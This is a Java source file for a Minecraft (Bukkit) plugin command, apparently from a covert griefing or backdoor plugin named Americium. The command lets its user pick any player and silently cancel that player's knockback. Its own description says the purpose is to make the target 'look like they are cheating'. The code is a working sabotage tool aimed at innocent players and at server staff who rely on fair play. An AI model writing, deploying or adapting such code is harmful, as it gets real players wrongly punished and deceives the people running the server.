package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerVelocityEvent;

import java.util.ArrayList;
import java.util.UUID;

public class Velocity implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();

    @Override
    public int minAConsoleArgs() {
        return 1;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"velocity", "antikb"};
    }

    @Override
    public String getDescription() {
        return "Toggles someone's velocity to make it look like they are cheating.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        Player selected = executor;
        if (args.length != 0) {
            selected = Bukkit.getPlayer(args[0]);
            if (selected == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }
        }

        String name = selected.getName().equals(sender.getName()) ? "Your" : selected.getName() + "'s";
        if (toggled.contains(selected.getUniqueId())) {
            toggled.remove(selected.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + name + " velocity was disabled!");
            return;
        }

        toggled.add(selected.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + name + " velocity was enabled!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onVelocity(PlayerVelocityEvent e) {
        if (toggled.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
        }
    }
}
